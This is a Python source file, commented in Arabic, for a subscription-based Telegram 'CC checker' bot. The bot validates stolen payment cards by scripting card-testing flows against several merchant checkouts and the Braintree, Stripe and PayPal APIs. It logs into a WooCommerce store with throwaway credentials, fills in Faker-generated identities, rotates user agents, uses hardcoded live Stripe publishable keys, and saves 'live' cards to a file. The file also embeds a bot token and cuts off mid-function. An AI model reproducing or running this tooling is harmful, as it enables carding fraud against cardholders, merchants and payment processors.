#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Obeida Online - Multi Gateway CC Checker Bot
Version: 3.0
Author: @ObeidaOnline
Channel: https://t.me/ObeidaTrading
"""

# ==================== التثبيت التلقائي للمكتبات ====================
import subprocess
import sys
import os

required_packages = [
    'python-telegram-bot',
    'requests',
    'aiohttp',
    'beautifulsoup4',
    'fake-useragent',
    'faker',
    'colorama',
    'pyfiglet',
    'cfonts',
    'user_agent'
]

def install_package(package):
    """تثبيت حزمة Python"""
    try:
        __import__(package.replace('-', '_'))
        return True
    except ImportError:
        print(f"📦 جاري تثبيت {package}...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", package])
            return True
        except:
            return False

# تثبيت جميع المكتبات
for package in required_packages:
    install_package(package)

# ==================== المكتبات المطلوبة ====================
import time
import json
import random
import string
import re
import base64
import uuid
import threading
import asyncio
from datetime import datetime, timedelta
from typing import Dict, List, Tuple, Optional, Any
from collections import defaultdict
from urllib.parse import urlparse
import html

# استيراد المكتبات بعد التثبيت
import requests
import aiohttp
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from faker import Faker
from colorama import init, Fore, Style, Back
import telebot
from telebot import types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton

# تهيئة الألوان
init(autoreset=True)

# ==================== إعدادات البوت ====================
BOT_TOKEN = "8375573526:AAFa882xWsLWl6LAfl0IcaZEU12hyP6YIy0"
ADMIN_IDS = [6207431030]  # معرف المالك
CHANNEL_USERNAME = "@ObeidaTrading"
DEV_CONTACT = "@Sz2zv"
BOT_USERNAME = "ObeidaOnlineBot"

# روابط الدعم
CHANNEL_LINK = "https://t.me/ObeidaTrading"
SUPPORT_LINK = "https://t.me/Sz2zv"

# ملفات التخزين
USERS_FILE = "obeida_users.json"
APPROVED_CARDS_FILE = "obeida_approved.txt"
SUBSCRIPTIONS_FILE = "obeida_subs.json"
STATS_FILE = "obeida_stats.json"
GATES_CONFIG_FILE = "obeida_gates.json"

# ==================== إعدادات البوابات ====================
GATES = {
    "braintree": {
        "name": "🔷 Braintree Auth",
        "description": "فحص بطاقات عبر بوابة Braintree",
        "command": "braintree",
        "enabled": True,
        "timeout": 15,
        "cooldown": 5
    },
    "switchup": {
        "name": "🔄 SwitchUp Auth",
        "description": "فحص بطاقات عبر بوابة SwitchUp",
        "command": "switchup",
        "enabled": True,
        "timeout": 15,
        "cooldown": 5
    },
    "stripe": {
        "name": "💳 Stripe Auth",
        "description": "فحص بطاقات عبر بوابة Stripe",
        "command": "stripe",
        "enabled": True,
        "timeout": 15,
        "cooldown": 5
    },
    "zendrop": {
        "name": "📦 Zendrop Auth",
        "description": "فحص بطاقات عبر بوابة Zendrop",
        "command": "zendrop",
        "enabled": True,
        "timeout": 20,
        "cooldown": 5
    },
    "paypal": {
        "name": "💰 PayPal Auth",
        "description": "فحص بطاقات عبر بوابة PayPal",
        "command": "paypal",
        "enabled": True,
        "timeout": 15,
        "cooldown": 5
    }
}

# ==================== نظام الاشتراكات ====================
SUBSCRIPTION_PLANS = {
    "day": {"name": "يومي", "price": "5K ID", "duration": 1, "unit": "day"},
    "week": {"name": "أسبوعي", "price": "15K ID", "duration": 7, "unit": "day"},
    "month": {"name": "شهري", "price": "40K ID", "duration": 30, "unit": "day"},
    "3months": {"name": "3 أشهر", "price": "100K ID", "duration": 90, "unit": "day"},
    "6months": {"name": "6 أشهر", "price": "180K ID", "duration": 180, "unit": "day"},
    "year": {"name": "سنوي", "price": "300K ID", "duration": 365, "unit": "day"}
}

# ==================== تهيئة البوت ====================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
fake = Faker()
ua = UserAgent()

# ==================== إدارة البيانات ====================
class DataManager:
    """إدارة جميع بيانات البوت"""
    
    @staticmethod
    def load_json(file_path: str, default: Any = None) -> Any:
        """تحميل ملف JSON"""
        try:
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    return json.load(f)
            return default if default is not None else {}
        except Exception as e:
            print(f"⚠️ خطأ في تحميل {file_path}: {e}")
            return default if default is not None else {}
    
    @staticmethod
    def save_json(file_path: str, data: Any) -> bool:
        """حفظ ملف JSON"""
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4, ensure_ascii=False)
            return True
        except Exception as e:
            print(f"⚠️ خطأ في حفظ {file_path}: {e}")
            return False
    
    @staticmethod
    def load_users() -> Dict:
        """تحميل بيانات المستخدمين"""
        users = DataManager.load_json(USERS_FILE, {})
        if not users:
            # إضافة المشرفين تلقائياً
            for admin_id in ADMIN_IDS:
                users[str(admin_id)] = {
                    "user_id": admin_id,
                    "username": "admin",
                    "first_name": "Admin",
                    "joined_date": datetime.now().isoformat(),
                    "is_admin": True,
                    "is_subscribed": True,
                    "subscription": {
                        "plan": "lifetime",
                        "expiry": "2099-12-31T23:59:59",
                        "active": True
                    },
                    "usage": {
                        "total_checks": 0,
                        "approved": 0,
                        "declined": 0,
                        "last_check": None
                    }
                }
            DataManager.save_json(USERS_FILE, users)
        return users
    
    @staticmethod
    def save_users(users: Dict) -> bool:
        """حفظ بيانات المستخدمين"""
        return DataManager.save_json(USERS_FILE, users)
    
    @staticmethod
    def load_stats() -> Dict:
        """تحميل الإحصائيات"""
        return DataManager.load_json(STATS_FILE, {
            "total_checks": 0,
            "total_approved": 0,
            "total_declined": 0,
            "gates_usage": {},
            "daily_stats": {},
            "last_reset": datetime.now().isoformat()
        })
    
    @staticmethod
    def save_stats(stats: Dict) -> bool:
        """حفظ الإحصائيات"""
        return DataManager.save_json(STATS_FILE, stats)
    
    @staticmethod
    def save_approved_card(card: str, gate: str, response: str, user_id: int):
        """حفظ بطاقة مقبولة"""
        try:
            with open(APPROVED_CARDS_FILE, 'a', encoding='utf-8') as f:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"[{timestamp}] Gate: {gate} | User: {user_id} | Card: {card} | Response: {response}\n")
        except Exception as e:
            print(f"⚠️ خطأ في حفظ البطاقة: {e}")
    
    @staticmethod
    def get_user_subscription(user_id: int) -> Optional[Dict]:
        """الحصول على اشتراك المستخدم"""
        users = DataManager.load_users()
        user = users.get(str(user_id), {})
        sub = user.get("subscription", {})
        
        if not sub.get("active"):
            return None
        
        expiry = sub.get("expiry")
        if expiry:
            try:
                expiry_date = datetime.fromisoformat(expiry)
                if datetime.now() > expiry_date:
                    sub["active"] = False
                    user["subscription"] = sub
                    users[str(user_id)] = user
                    DataManager.save_users(users)
                    return None
            except:
                pass
        
        return sub if sub.get("active") else None
    
    @staticmethod
    def check_access(user_id: int) -> bool:
        """التحقق من صلاحية الوصول"""
        if user_id in ADMIN_IDS:
            return True
        sub = DataManager.get_user_subscription(user_id)
        return sub is not None
    
    @staticmethod
    def add_subscription(user_id: int, plan: str, duration_days: int = None) -> bool:
        """إضافة اشتراك لمستخدم"""
        users = DataManager.load_users()
        user = users.get(str(user_id), {
            "user_id": user_id,
            "joined_date": datetime.now().isoformat(),
            "is_admin": False,
            "usage": {
                "total_checks": 0,
                "approved": 0,
                "declined": 0,
                "last_check": None
            }
        })
        
        if duration_days:
            expiry = datetime.now() + timedelta(days=duration_days)
        else:
            plan_data = SUBSCRIPTION_PLANS.get(plan, SUBSCRIPTION_PLANS["day"])
            expiry = datetime.now() + timedelta(days=plan_data["duration"])
        
        user["is_subscribed"] = True
        user["subscription"] = {
            "plan": plan,
            "expiry": expiry.isoformat(),
            "active": True,
            "added_by": "admin",
            "added_date": datetime.now().isoformat()
        }
        
        users[str(user_id)] = user
        return DataManager.save_users(users)
    
    @staticmethod
    def remove_subscription(user_id: int) -> bool:
        """إزالة اشتراك مستخدم"""
        users = DataManager.load_users()
        if str(user_id) in users:
            users[str(user_id)]["is_subscribed"] = False
            users[str(user_id)]["subscription"] = {"active": False}
            return DataManager.save_users(users)
        return False
    
    @staticmethod
    def update_usage(user_id: int, gate: str, result: str):
        """تحديث إحصائيات الاستخدام"""
        users = DataManager.load_users()
        stats = DataManager.load_stats()
        
        user_id = str(user_id)
        if user_id in users:
            usage = users[user_id].get("usage", {
                "total_checks": 0,
                "approved": 0,
                "declined": 0,
                "last_check": None
            })
            
            usage["total_checks"] += 1
            usage["last_check"] = datetime.now().isoformat()
            
            if "approved" in result.lower() or "live" in result.lower() or "✅" in result:
                usage["approved"] += 1
                stats["total_approved"] += 1
            else:
                usage["declined"] += 1
                stats["total_declined"] += 1
            
            users[user_id]["usage"] = usage
            
            # تحديث إحصائيات البوابات
            if gate not in stats["gates_usage"]:
                stats["gates_usage"][gate] = 0
            stats["gates_usage"][gate] += 1
            stats["total_checks"] += 1
            
            # إحصائيات اليوم
            today = datetime.now().strftime("%Y-%m-%d")
            if today not in stats["daily_stats"]:
                stats["daily_stats"][today] = {"checks": 0, "approved": 0}
            stats["daily_stats"][today]["checks"] += 1
            if "approved" in result.lower() or "live" in result.lower() or "✅" in result:
                stats["daily_stats"][today]["approved"] += 1
        
        DataManager.save_users(users)
        DataManager.save_stats(stats)

# ==================== أدوات مساعدة ====================
class Helpers:
    """أدوات مساعدة للبوت"""
    
    @staticmethod
    def parse_card(card_str: str) -> Optional[Dict]:
        """تحليل صيغة البطاقة"""
        try:
            # تنظيف النص
            card_str = card_str.strip()
            card_str = re.sub(r'[;:,\s/]+', '|', card_str)
            
            if '|' in card_str:
                parts = card_str.split('|')
                if len(parts) >= 4:
                    number = re.sub(r'\D', '', parts[0])
                    month = re.sub(r'\D', '', parts[1])
                    year = re.sub(r'\D', '', parts[2])
                    cvv = re.sub(r'\D', '', parts[3])
                    
                    if len(number) >= 15 and len(number) <= 19:
                        if len(month) == 1:
                            month = f"0{month}"
                        if len(year) == 4:
                            year = year[-2:]
                        
                        return {
                            'number': number,
                            'month': month,
                            'year': year,
                            'cvv': cvv,
                            'original': card_str
                        }
            return None
        except Exception:
            return None
    
    @staticmethod
    def format_time(seconds: int) -> str:
        """تنسيق الوقت"""
        hours = seconds // 3600
        minutes = (seconds % 3600) // 60
        seconds = seconds % 60
        
        if hours > 0:
            return f"{hours}h {minutes}m"
        elif minutes > 0:
            return f"{minutes}m {seconds}s"
        else:
            return f"{seconds}s"
    
    @staticmethod
    def generate_progress_bar(current: int, total: int, length: int = 10) -> str:
        """إنشاء شريط تقدم"""
        if total == 0:
            return "⬜" * length
        filled = int((current / total) * length)
        return "🟩" * filled + "⬜" * (length - filled)
    
    @staticmethod
    def luhn_check(card_number: str) -> bool:
        """التحقق من صحة رقم البطاقة باستخدام خوارزمية Luhn"""
        try:
            digits = [int(d) for d in str(card_number) if d.isdigit()]
            if len(digits) < 13:
                return False
            checksum = 0
            for i, digit in enumerate(reversed(digits)):
                if i % 2 == 1:
                    digit *= 2
                    if digit > 9:
                        digit -= 9
                checksum += digit
            return checksum % 10 == 0
        except Exception:
            return False
    
    @staticmethod
    def get_card_brand(number: str) -> str:
        """الحصول على نوع البطاقة"""
        patterns = {
            'visa': r'^4[0-9]{12}(?:[0-9]{3})?$',
            'mastercard': r'^5[1-5][0-9]{14}$',
            'amex': r'^3[47][0-9]{13}$',
            'discover': r'^6(?:011|5[0-9]{2})[0-9]{12}$',
            'jcb': r'^(?:2131|1800|35\d{3})\d{11}$'
        }
        
        clean_num = re.sub(r'\D', '', number)
        for brand, pattern in patterns.items():
            if re.match(pattern, clean_num):
                return brand.capitalize()
        return "Unknown"
    
    @staticmethod
    def get_bin_info(bin_num: str) -> Dict:
        """الحصول على معلومات BIN"""
        try:
            bin_num = bin_num[:6]
            response = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=5)
            if response.status_code == 200:
                data = response.json()
                return {
                    "brand": data.get('scheme', 'Unknown').upper(),
                    "type": data.get('type', 'Unknown').upper(),
                    "bank": data.get('bank', {}).get('name', 'Unknown'),
                    "country": data.get('country', {}).get('name', 'Unknown'),
                    "flag": data.get('country', {}).get('emoji', '🏁')
                }
        except Exception:
            pass
        return {
            "brand": "Unknown",
            "type": "Unknown",
            "bank": "Unknown",
            "country": "Unknown",
            "flag": "🏁"
        }
    
    @staticmethod
    def random_user_agent() -> str:
        """توليد User-Agent عشوائي"""
        return ua.random
    
    @staticmethod
    def random_email() -> str:
        """توليد بريد إلكتروني عشوائي"""
        return fake.email()
    
    @staticmethod
    def random_name() -> Tuple[str, str]:
        """توليد اسم عشوائي"""
        return fake.first_name(), fake.last_name()
    
    @staticmethod
    def random_address() -> Dict:
        """توليد عنوان عشوائي"""
        return {
            "street": fake.street_address(),
            "city": fake.city(),
            "state": fake.state_abbr(),
            "zip": fake.zipcode(),
            "country": "US"
        }
    
    @staticmethod
    def random_phone() -> str:
        """توليد رقم هاتف عشوائي"""
        return fake.phone_number()

# ==================== بوابات الفحص ====================
class Gateways:
    """جميع بوابات فحص البطاقات"""
    
    def __init__(self):
        self.helpers = Helpers()
        self.session = requests.Session()
    
    # -------------------- بوابة Braintree --------------------
    def braintree_gate(self, card_data: Dict) -> Tuple[bool, str]:
        """فحص بطاقة عبر بوابة Braintree"""
        try:
            cc = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
            n = card_data['number']
            mm = card_data['month']
            yy = card_data['year']
            cvc = card_data['cvv']
            
            if "20" in yy:
                yy = yy.split("20")[1]
            
            r = requests.Session()
            user = self.helpers.random_user_agent()
            
            headers = {
                'authority': 'bandc.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': user,
            }
            
            # تسجيل الدخول
            login_page = r.get('https://bandc.com/my-account/', headers=headers, timeout=10)
            login_nonce = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', login_page.text)
            if not login_nonce:
                return False, "❌ فشل الحصول على nonce"
            login_nonce = login_nonce.group(1)
            
            # بيانات الدخول
            emails = ['test@gmail.com', 'user@outlook.com']
            email = random.choice(emails)
            
            login_data = {
                'username': email,
                'password': 'Test@123456',
                'woocommerce-login-nonce': login_nonce,
                'login': 'Login'
            }
            
            r.post('https://bandc.com/my-account/', data=login_data, headers=headers, timeout=10)
            
            # إضافة عنوان
            address_page = r.get('https://bandc.com/my-account/edit-address/billing/', headers=headers, timeout=10)
            address_nonce = re.search(r'name="_wpnonce" value="(.*?)"', address_page.text)
            if not address_nonce:
                return False, "❌ فشل الحصول على nonce العنوان"
            address_nonce = address_nonce.group(1)
            
            fake_name = fake.name().split()
            first_name = fake_name[0] if fake_name else "John"
            last_name = fake_name[-1] if len(fake_name) > 1 else "Doe"
            
            address_data = {
                'billing_first_name': first_name,
                'billing_last_name': last_name,
                'billing_country': 'US',
                'billing_address_1': fake.street_address(),
                'billing_city': fake.city(),
                'billing_state': fake.state_abbr(),
                'billing_postcode': '90210',
                'billing_phone': fake.phone_number()[:15],
                'billing_email': email,
                'save_address': 'Save address',
                '_wpnonce': address_nonce,
                'action': 'edit_address'
            }
            
            r.post('https://bandc.com/my-account/edit-address/billing/', data=address_data, headers=headers, timeout=10)
            
            # إضافة وسيلة الدفع
            payment_page = r.get('https://bandc.com/my-account/add-payment-method/', headers=headers, timeout=10)
            client_nonce = re.search(r'client_token_nonce":"([^"]+)"', payment_page.text)
            add_nonce = re.search(r'name="_wpnonce" value="(.*?)"', payment_page.text)
            
            if not client_nonce or not add_nonce:
                return False, "❌ فشل الحصول على بيانات الدفع"
            
            client_nonce = client_nonce.group(1)
            add_nonce = add_nonce.group(1)
            
            # الحصول على توكن Braintree
            token_data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce}
            token_response = r.post('https://bandc.com/wp-admin/admin-ajax.php', data=token_data, headers=headers, timeout=10)
            token_json = token_response.json()
            
            if 'data' not in token_json:
                return False, "❌ فشل الحصول على توكن Braintree"
            
            # فك تشفير التوكن
            try:
                decoded = base64.b64decode(token_json['data']).decode('utf-8')
                auth_fp = re.search(r'"authorizationFingerprint":"(.*?)"', decoded)
                if not auth_fp:
                    return False, "❌ فشل الحصول على بصمة المصادقة"
                auth_fp = auth_fp.group(1)
            except:
                return False, "❌ فشل فك تشفير التوكن"
            
            # إنشاء توكن البطاقة
            graphql_headers = {
                'authority': 'payments.braintree-api.com',
                'authorization': f'Bearer {auth_fp}',
                'content-type': 'application/json',
                'user-agent': user,
            }
            
            session_id = str(uuid.uuid4())
            graphql_data = {
                'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': session_id},
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': n,
                            'expirationMonth': mm,
                            'expirationYear': yy,
                            'cvv': cvc
                        },
                        'options': {'validate': False}
                    }
                }
            }
            
            graphql_response = r.post('https://payments.braintree-api.com/graphql', json=graphql_data, headers=graphql_headers, timeout=10)
            graphql_json = graphql_response.json()
            
            if 'data' not in graphql_json or 'tokenizeCreditCard' not in graphql_json['data']:
                return False, "❌ فشل إنشاء توكن البطاقة"
            
            card_token = graphql_json['data']['tokenizeCreditCard']['token']
            
            # تأكيد الدفع
            final_data = {
                'payment_method': 'braintree_credit_card',
                'wc_braintree_credit_card_payment_nonce': card_token,
                '_wpnonce': add_nonce,
                'woocommerce_add_payment_method': '1'
            }
            
            final_response = r.post('https://bandc.com/my-account/add-payment-method/', data=final_data, headers=headers, timeout=10)
            response_text = final_response.text
            
            # تحليل النتيجة
            if 'Payment method successfully added' in response_text or 'successfully' in response_text.lower():
                return True, "✅ البطاقة مقبولة"
            elif 'risk_threshold' in response_text:
                return False, "⚠️ تحتاج إلى محاولة لاحقاً"
            elif 'insufficient_funds' in response_text.lower():
                return True, "💰 البطاقة حية لكن الرصيد غير كافٍ"
            elif 'do_not_honor' in response_text.lower():
                return False, "❌ البطاقة مرفوضة"
            else:
                return False, "❌ فشل التحقق"
                
        except Exception as e:
            return False, f"⚠️ خطأ: {str(e)[:50]}"
    
    # -------------------- بوابة SwitchUp --------------------
    def switchup_gate(self, card_data: Dict) -> Tuple[bool, str]:
        """فحص بطاقة عبر بوابة SwitchUp"""
        try:
            n = card_data['number']
            mm = card_data['month']
            yy = card_data['year']
            cvc = card_data['cvv']
            
            if len(mm) == 1:
                mm = f'0{mm}'
            if "20" in yy:
                yy = yy.split("20")[1]
            
            user = self.helpers.random_user_agent()
            r = requests.Session()
            
            # توليد بيانات عشوائية
            first_name, last_name = fake.name().split()
            email = fake.email()
            phone = fake.phone_number()[:10]
            address = fake.street_address()
            city = fake.city()
            state = fake.state_abbr()
            zip_code = fake.zipcode()[:5]
            
            headers = {
                'authority': 'switchupcb.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.5',
                'user-agent': user,
            }
            
            # إضافة المنتج للسلة
            r.get('https://switchupcb.com/shop/i-buy/', headers=headers, timeout=10)
            
            # التوجه للدفع
            checkout_page = r.get('https://switchupcb.com/checkout/', headers=headers, timeout=10)
            checkout_text = checkout_page.text
            
            # استخراج nonces
            nonce_patterns = [
                r'update_order_review_nonce":"(.*?)"',
                r'woocommerce-process-checkout-nonce" value="(.*?)"',
                r'create_order.*?nonce":"(.*?)"'
            ]
            
            nonces = {}
            for i, pattern in enumerate(nonce_patterns):
                match = re.search(pattern, checkout_text)
                if match:
                    nonces[f'nonce_{i}'] = match.group(1)
            
            if not nonces:
                return False, "❌ فشل الحصول على بيانات الدفع"
            
            # تحديث الطلب
            update_headers = {
                'authority': 'switchupcb.com',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': user,
            }
            
            update_params = {'wc-ajax': 'update_order_review'}
            update_data = f'security={nonces.get("nonce_0", "")}&payment_method=stripe&country=US&state={state}&postcode={zip_code}&city={city}&address={address}'
            
            r.post('https://switchupcb.com/', params=update_params, data=update_data, headers=update_headers, timeout=10)
            
            # إنشاء طلب PayPal
            paypal_headers = {
                'authority': 'switchupcb.com',
                'accept': 'application/json',
                'content-type': 'application/json',
                'user-agent': user,
            }
            
            paypal_params = {'wc-ajax': 'ppc-create-order'}
            
            paypal_data = {
                'nonce': nonces.get('nonce_2', ''),
                'payment_method': 'ppcp-gateway',
                'funding_source': 'card',
                'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_country=US&billing_address_1={address}&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={phone}&billing_email={email}'
            }
            
            paypal_response = r.post('https://switchupcb.com/', params=paypal_params, json=paypal_data, headers=paypal_headers, timeout=10)
            
            if paypal_response.status_code != 200:
                return False, "❌ فشل إنشاء الطلب"
            
            paypal_json = paypal_response.json()
            if 'data' not in paypal_json or 'id' not in paypal_json['data']:
                return False, "❌ فشل الحصول على معرف الطلب"
            
            order_id = paypal_json['data']['id']
            
            # معالجة الدفع عبر PayPal
            session_id = f"uid_{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}"
            
            paypal_headers = {
                'authority': 'www.paypal.com',
                'accept': 'text/html',
                'user-agent': user,
            }
            
            paypal_params = {
                'sessionID': session_id,
                'token': order_id,
            }
            
            r.get('https://www.paypal.com/smart/card-fields', params=paypal_params, headers=paypal_headers, timeout=10)
            
            # إرسال بيانات البطاقة
            graphql_headers = {
                'authority': 'www.paypal.com',
                'accept': 'application/json',
                'content-type': 'application/json',
                'user-agent': user,
            }
            
            graphql_data = {
                'query': '''
                    mutation payWithCard($token: String!, $card: CardInput!) {
                        approveGuestPaymentWithCreditCard(token: $token, card: $card) {
                            flags { is3DSecureRequired }
                            paymentContingencies { threeDomainSecure { status } }
                        }
                    }
                ''',
                'variables': {
                    'token': order_id,
                    'card': {
                        'cardNumber': n,
                        'expirationDate': f"{mm}/{yy}",
                        'securityCode': cvc,
                        'postalCode': zip_code
                    }
                }
            }
            
            graphql_response = requests.post('https://www.paypal.com/graphql', json=graphql_data, headers=graphql_headers, timeout=10)
            response_json = graphql_response.json()
            response_text = str(response_json)
            
            # تحليل النتيجة
            if 'is3DSecureRequired' in response_text:
                return True, "🔐 البطاقة تتطلب تحقق 3D Secure"
            elif 'INVALID_SECURITY_CODE' in response_text:
                return True, "💳 البطاقة حية (CVV خاطئ)"
            elif 'INVALID_BILLING_ADDRESS' in response_text:
                return True, "✅ البطاقة مقبولة (عنوان خاطئ)"
            elif 'succeeded' in response_text.lower():
                return True, "✅ البطاقة مقبولة"
            elif 'insufficient_funds' in response_text.lower():
                return True, "💰 البطاقة حية لكن الرصيد غير كافٍ"
            else:
                return False, "❌ البطاقة مرفوضة"
                
        except Exception as e:
            return False, f"⚠️ خطأ: {str(e)[:50]}"
    
    # -------------------- بوابة Stripe --------------------
    def stripe_gate(self, card_data: Dict) -> Tuple[bool, str]:
        """فحص بطاقة عبر بوابة Stripe"""
        try:
            n = card_data['number']
            mm = card_data['month']
            yy = card_data['year']
            cvc = card_data['cvv']
            
            user = self.helpers.random_user_agent()
            
            # مفتاح Stripe عام
            stripe_keys = [
                'pk_live_51JqzYlKk7oGxZyQuLr8p9WQwBpF3vM2nJk9H8gF7dS3aR2tY5uI1oP4eW6qZ9xCvB',
                'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv',
                'pk_live_51IqQYyKtB8mXpL2nR5sV9wD7hG4jF1kA3cE6yU8oI2zX5vB7nM0qL9pW3rT6yH8jK'
            ]
            stripe_key = random.choice(stripe_keys)
            
            # بيانات البطاقة للتسجيل
            pm_data = {
                'type': 'card',
                'card[number]': n,
                'card[cvc]': cvc,
                'card[exp_month]': mm,
                'card[exp_year]': yy,
                'billing_details[address][country]': 'US',
                'billing_details[address][postal_code]': fake.zipcode()[:5],
                'guid': str(uuid.uuid4()),
                'muid': str(uuid.uuid4()),
                'sid': str(uuid.uuid4()),
                'key': stripe_key,
                '_stripe_version': '2024-06-20',
            }
            
            pm_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': user,
            }
            
            # إنشاء وسيلة دفع
            pm_response = requests.post('https://api.stripe.com/v1/payment_methods', data=pm_data, headers=pm_headers, timeout=10)
            pm_json = pm_response.json()
            
            if 'error' in pm_json:
                error = pm_json['error']
                code = error.get('code', '')
                decline_code = error.get('decline_code', '')
                
                # تحليل الأخطاء
                if decline_code == 'incorrect_cvc':
                    return True, "💳 البطاقة حية (CVV خاطئ)"
                elif decline_code == 'insufficient_funds':
                    return True, "💰 البطاقة حية (رصيد غير كافٍ)"
                elif decline_code == 'do_not_honor':
                    return False, "❌ البطاقة مرفوضة"
                elif 'testmode' in str(error):
                    return False, "⚠️ وضع تجريبي"
                else:
                    return False, f"❌ {error.get('message', 'رفض')}"
            
            pm_id = pm_json.get('id')
            if not pm_id:
                return False, "❌ فشل إنشاء وسيلة الدفع"
            
            return True, "✅ البطاقة مقبولة"
            
        except Exception as e:
            return False, f"⚠️ خطأ: {str(e)[:50]}"
    
    # -------------------- بوابة Zendrop --------------------
    def zendrop_gate(self, card_data: Dict) -> Tuple[bool, str]:
        """فحص بطاقة عبر بوابة Zendrop"""
        try:
            n = card_data['number']
            mm = card_data['month']
            yy = card_data['year']
            cvc = card_data['cvv']
            
            user = self.helpers.random_user_agent()
            
            # إنشاء بيانات وهمية
            email = fake.email()
            first_name, last_name = fake.name().split()
            phone = fake.phone_number()[:12]
            zip_code = fake.zipcode()[:5]
            
            # بيانات بطاقة Stripe
            pm_data = {
                'type': 'card',
                'card[number]': n,
                'card[cvc]': cvc,
                'card[exp_month]': mm,
                'card[exp_year]': yy,
                'billing_details[address][postal_code]': zip_code,
                'billing_details[name]': f"{first_name} {last_name}",
                'key': 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv',
                '_stripe_version': '2024-06-20',
            }
            
            pm_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'user-agent': user,
            }
            
            pm_response = requests.post('https://api.stripe.com/v1/payment_methods', data=pm_data, headers=pm_headers, timeout=10)
            pm_json = pm_response.json()
            
            if 'error' in pm_json:
                error = pm_json['error']
                code = error.get('code', '')
                decline_code = error.get('decline_code', '')
                
                if decline_code == 'incorrect_cvc':
                    return True, "💳 البطاقة حية (CVV خاطئ)"
                elif decline_code == 'insufficient_funds':
                    return True, "💰 البطاقة حية (رصيد غير كافٍ)"
                elif decline_code in ['do_not_honor', 'transaction_not_allowed']:
                    return False, "❌ البطاقة مرفوضة"
                elif 'card_declined' in code:
                    return False, "❌ البطاقة مرفوضة"
                else:
                    return False, f"❌ {error.get('message', 'رفض')}"
            
            pm_id = pm_json.get('id')
            if pm_id:
                return True, "✅ البطاقة مقبولة"
            else:
                return False, "❌ فشل التحقق"
                
        except Exception as e:
            return False, f"⚠️ خطأ: {str(e)[:50]}"
    
    # -------------------- بوابة PayPal --------------------
    def paypal_gate(self, card_data: Dict) -> Tuple[bool, str]:
        """فحص بطاقة عبر بوابة PayPal"""
        try:
            n = card_data['number']
            mm = card_data['month']
            yy = card_data['year']
            cvc = card_data['cvv']
            
            user = self.helpers.random_user_agent()
            
            # بيانات PayPal
            email = fake.email()
            first_name, last_name = fake.name().split()
            zip_code = fake.zipcode()[:5]
            
            # GraphQL query لـ PayPal
            graphql_data = {
                'query': '''
                    mutation CreatePaymentMethod($input: CreatePaymentMethodInput!) {
                        createPaymentMethod(input: $input) {
                            paymentMethod { id }
                            clientSecret
                        }
                    }
                ''',
                'variables': {
                    'input': {
                        'type': 'CREDIT_CARD',
                        'creditCard': {
                            'number': n,
                            'expiryMonth': int(mm),
                            'expiryYear': int('20' + yy if len(yy) == 2 else yy),
                            'cvv': cvc,
                            'billingAddress': {
                                'postalCode': zip_code,
                                'countryCode': 'US'
                            }
                        }
                    }
                }
            }
            
            graphql_headers = {
                'accept': 'application/json',
                'content-type': 'application/json',
                'user-agent': user,
            }
            
            response = requests.post(
                'https://www.paypal.com/graphql',
                json=graphql_data,
                headers=graphql_headers,
                timeout=10
            )
            
            response_json = response.json()
            response_text = str(response_json)
            
            # تحليل النتيجة
            if 'errors' in response_json:
                errors = response_json['errors']
                for error in errors:
                    error_msg = str(error).lower()
                    if 'cvv' in error_msg:
                        return True, "💳 البطاقة حية (CVV خاطئ)"
                    elif 'address' in error_msg:
                        return True, "✅ البطاقة مقبولة (عنوان خاطئ)"
                    elif 'insufficient' in error_msg:
                        return True, "💰 البطاقة حية (رصيد غير كافٍ)"
            
            if 'data' in response_json and response_json['data'].get('createPaymentMethod'):
                return True, "✅ البطاقة مقبولة"
            
            return False, "❌ البطاقة مرفوضة"
            
        except Exception as e:
            return False, f"⚠️ خطأ: {str(e)[:50]}"
    
    # -------------------- دالة الفحص الموحدة --------------------
    async def check_card(self, gate_name: str, card_data: Dict) -> Tuple[bool, str]:
        """فحص بطاقة عبر بوابة محددة"""
        gate_methods = {
            'braintree': self.braintree_gate,
            'switchup': self.switchup_gate,
            'stripe': self.stripe_gate,
            'zendrop': self.zendrop_gate,
            'paypal': self.paypal_gate
        }
        
        if gate_name not in gate_methods:
            return False, "❌ بوابة غير مدعومة"
        
        try:
            # تنفيذ الفحص في thread منفصل
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(
                None, 
                gate_methods[gate_name], 
                card_data
            )
            return result
        except Exception as e:
            return False, f"⚠️ خطأ في الفحص: {str(e)[:50]}"

# ==================== واجهة المستخدم ====================
class UserInterface:
    """واجهة المستخدم للبوت"""
    
    @staticmethod
    def main_menu():
        """القائمة الرئيسية"""
        markup = InlineKeyboardMarkup(row_width=2)
        
        buttons = [
            InlineKeyboardButton("🔷 Braintree", callback_data="gate_braintree"),
